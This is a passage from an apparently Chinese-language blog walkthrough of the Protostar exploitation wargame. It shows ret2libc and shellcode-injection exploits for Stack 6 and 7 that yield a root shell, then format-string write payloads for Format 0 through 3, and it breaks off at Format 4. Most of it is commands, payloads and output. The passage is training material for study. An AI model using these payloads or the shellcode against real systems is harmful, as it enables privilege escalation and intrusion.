/lib/ld-2.11.2.so</span><br><span class="line">        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so</span><br><span class="line">        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so</span><br><span class="line">        0xbffeb000 0xc0000000    0x15000          0           [stack]</span><br><span class="line">(gdb) find 0xb7e9700,+2000000,<span class="string">"/bin/sh"</span></span><br><span class="line">warning: Unable to access target memory at 0xb7e9700, halting search.</span><br><span class="line">Pattern not found.</span><br><span class="line">(gdb) find 0xb7e97000,+2000000,<span class="string">"/bin/sh"</span></span><br><span class="line">0xb7fba23f</span><br><span class="line">warning: Unable to access target memory at 0xb7fd9647, halting search.</span><br><span class="line">1 pattern found.</span><br><span class="line">(gdb) x/s 0xb7fba23f</span><br><span class="line">0xb7fba23f:      <span class="string">"KIND in __gen_tempname\""</span></span><br></pre></td></tr></table></figure><p>其中一行说到<strong><code>0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</code></strong>，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh</span><br><span class="line"> 11f3bf /bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0xb7fb63bf</span><br><span class="line">0xb7fb63bf:      <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print 'a'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\xbf\x63\xfb\xb7'"</span>; cat) | ./stack6</span><br><span class="line">input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`췿c▒</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><h2 id="solution-4-ROP（TODO）"><a href="#solution-4-ROP（TODO）" class="headerlink" title="solution 4: ROP（TODO）"></a>solution 4: ROP（TODO）</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>总览：<a href="https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref" target="_blank" rel="noopener">https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref</a></p><p>总览：<a href="http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html" target="_blank" rel="noopener">http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html</a></p><p>ret2.text：<a href="http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html" target="_blank" rel="noopener">http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html</a></p><p>ret2libc：<a href="https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html" target="_blank" rel="noopener">https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html</a></p><p>ret2libc：<a href="https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0" target="_blank" rel="noopener">https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0</a></p><p>ROP：<a href="https://media.blackhat.com/bh-usa-08/video/bh-us-08-Shacham/black-hat-usa-08-shacham-return-oriented-programming-hires.m4v" target="_blank" rel="noopener">blackhat-Return-Oriented Programming: Exploits Without Code Injection</a></p><p>ROP：<a href="https://speakerdeck.com/l4ys/rop-qing-song-tan" target="_blank" rel="noopener">ROP轻松谈</a></p><h1 id="Stack-7"><a href="#Stack-7" class="headerlink" title="Stack 7"></a>Stack 7</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; msfelfscan stack7</span><br><span class="line">[*] <span class="built_in">exec</span>: msfelfscan stack7</span><br><span class="line"></span><br><span class="line">Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfelfscan [mode] &lt;options&gt; [targets]</span><br><span class="line"></span><br><span class="line">Modes:</span><br><span class="line">    -j, --jump [regA,regB,regC]      Search <span class="keyword">for</span> jump equivalent instructions</span><br><span class="line">    -p, --poppopret                  Search <span class="keyword">for</span> pop+pop+ret combinations</span><br><span class="line">    -r, --regex [regex]              Search <span class="keyword">for</span> regex match</span><br><span class="line">    -a, --analyze-address [address]  Display the code at the specified address</span><br><span class="line">    -b, --analyze-offset [offset]    Display the code at the specified offset</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -A, --after [bytes]              Number of bytes to show after match (-a/-b)</span><br><span class="line">    -B, --before [bytes]             Number of bytes to show before match (-a/-b)</span><br><span class="line">    -D, --disasm                     Disassemble the bytes at this address</span><br><span class="line">    -I, --image-base [address]       Specify an alternate ImageBase</span><br><span class="line">    -h, --<span class="built_in">help</span>                       Show this message</span><br><span class="line">msf &gt; msfelfscan --jump eax stack7</span><br><span class="line">[*] <span class="built_in">exec</span>: msfelfscan --jump eax stack7</span><br><span class="line"></span><br><span class="line">[stack7]</span><br><span class="line">0x080484bf call eax</span><br><span class="line">0x080485eb call eax</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ (python -c <span class="string">"print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xbf\x84\x04\x08'"</span>; cat) | ./stack7</span><br><span class="line">input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><br><span class="line">                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><h1 id="Format-0"><a href="#Format-0" class="headerlink" title="Format 0"></a>Format 0</h1><h2 id="solution-0-stackoverflow"><a href="#solution-0-stackoverflow" class="headerlink" title="solution 0: stackoverflow"></a>solution 0: stackoverflow</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'a'*64+'\xef\xbe\xad\xde'"</span> | xargs ./format0</span><br><span class="line">you have hit the target correctly :)</span><br></pre></td></tr></table></figure><h2 id="solution-1-format-string"><a href="#solution-1-format-string" class="headerlink" title="solution 1: format string"></a>solution 1: format string</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$  python -c <span class="string">"print '%64d\xef\xbe\xad\xde'"</span> | xargs ./format0</span><br><span class="line">you have hit the target correctly :)</span><br></pre></td></tr></table></figure><h1 id="Format-1"><a href="#Format-1" class="headerlink" title="Format 1"></a>Format 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t format1 | grep target</span><br><span class="line">08049638 g     O .bss   00000004              target</span><br><span class="line">$ ./format1 `python -c <span class="string">"print '\x38\x96\x04\x08A' +'%08x.'*127+'%08n.'+'%08x.'*22"</span>`</span><br><span class="line">8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you have modified the target :)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ i=0; <span class="keyword">while</span> [ <span class="variable">$i</span> -le 200 ]; <span class="keyword">do</span> ./format1 `python -c <span class="string">"print 'aaaa%%%03d\\\$08x.' % <span class="variable">$i</span>"</span>` ; i=$((i+1)); <span class="keyword">done</span></span><br><span class="line">aaaa%0<span class="variable">$08x</span>.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.</span><br><span class="line">$ ./format1 `python -c <span class="string">"print '\x38\x96\x04\x08%130\\\$08n.'"</span>`</span><br><span class="line">8.you have modified the target :)</span><br></pre></td></tr></table></figure><h1 id="Format-2"><a href="#Format-2" class="headerlink" title="Format 2"></a>Format 2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t format2 | grep target</span><br><span class="line">080496e4 g     O .bss   00000004              target</span><br><span class="line">$ i=0; <span class="keyword">while</span> [ <span class="variable">$i</span> -le 10 ]; <span class="keyword">do</span> python -c <span class="string">"print 'aaaa%%%03d\$08x.' % <span class="variable">$i</span>"</span> | ./format2 ; i=$((i+1)); <span class="keyword">done</span></span><br><span class="line">aaaa%0<span class="variable">$08x</span>.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaa00000200.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaab7fd8420.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaabffffb14.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaa61616161.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaa35303025.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaa78383024.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaa00000a2e.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaab7fff524.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaabffffb70.</span><br><span class="line">target is 0 :(</span><br><span class="line">aaaab7fe35c9.</span><br><span class="line">target is 0 :(</span><br><span class="line">$ python -c <span class="string">"print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08x.'"</span> | ./format2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.</span><br><span class="line">target is 0 :(</span><br><span class="line">$ python -c <span class="string">"print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08n.'"</span> | ./format2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</span><br><span class="line">you have modified the target :)</span><br></pre></td></tr></table></figure><h1 id="Format-3"><a href="#Format-3" class="headerlink" title="Format 3"></a>Format 3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t format3 | grep target</span><br><span class="line">080496f4 g     O .bss   00000004              target</span><br><span class="line">$ i=0; <span class="keyword">while</span> [ <span class="variable">$i</span> -le 20 ]; <span class="keyword">do</span> python -c <span class="string">"print 'aaaa%%%03d\$08x.' % <span class="variable">$i</span>"</span> | ./format3 ; i=$((i+1)); <span class="keyword">done</span></span><br><span class="line">aaaa%0<span class="variable">$08x</span>.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000000.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaabffffad0.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaab7fd7ff4.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000000.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000000.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaabffffcd8.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa0804849d.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaabffffad0.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000200.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaab7fd8420.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaabffffb14.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa61616161.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa33313025.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa78383024.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000a2e.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaab7fff524.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaabffffb70.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaab7fe35c9.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000007.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">aaaa00000010.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print '\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%13\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">Segmentation fault</span><br><span class="line">$ python -c <span class="string">"print 'a%13\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%14\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%14\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%14\$08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><br><span class="line">target is 00000100 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.</span><br><span class="line">target is 01000000 :(</span><br><span class="line">$ python -c <span class="string">"print 'a%16\$08na%17\$08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">Segmentation fault</span><br><span class="line">$ python -c <span class="string">"print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.</span><br><span class="line">target is 00020000 :(</span><br><span class="line">$ python -c <span class="string">"print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x.'+'a'*(0x55-0x44)+'%13\$08x.'+'a'*(0x102-0x55)+'%14\$08x.'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.</span><br><span class="line">target is 00000000 :(</span><br><span class="line">$ python -c <span class="string">"print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x'+'a'*(0x55-0x44)+'%13\$08x'+'a'*(0x102-0x55)+'%14\$08x'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6</span><br></pre></td></tr></table></figure><h2 id="solution-0-Brute"><a href="#solution-0-Brute" class="headerlink" title="solution 0: Brute!"></a>solution 0: Brute!</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print '\xf4\x96\x04\x08'+'%016930112d'+'%12\$08n'"</span> | ./format3</span><br><span class="linespan><br><span class="line"><span class="comment"># 反正这里有很多很多很多零，我就好心删了它们</span></span><br><span class="line">...0000000000000</span><br><span class="line">you have modified the target :)</span><br></pre></td></tr></table></figure><h2 id="solution-1-Gentle"><a href="#solution-1-Gentle" class="headerlink" title="solution 1: Gentle"></a>solution 1: Gentle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08n'+'a'*(0x55-0x44)+'%13\$08n'+'a'*(0x102-0x55)+'%14\$08n'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">you have modified the target :)</span><br></pre></td></tr></table></figure><h2 id="solution-2-More-gentle"><a href="#solution-2-More-gentle" class="headerlink" title="solution 2: More gentle"></a>solution 2: More gentle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'a'+'%16\$hhn'+'a'+'%17\$hhn'+'\xf7\x96\x04\x08'+'\xf6\x96\x04\x08'+'\xf5\x96\x04\x08'+'\xf4\x96\x04\x08'+'a'*(0x44-2-16)+'%19\$hhn'+'a'*(0x55-0x44)+'%18\$hhn'"</span> | ./format3</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">you have modified the target :)</span><br></pre></td></tr></table></figure><h1 id="Format-4"><a href="#Format-4" class="headerlink" title="Format 4"></a>Format 4</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 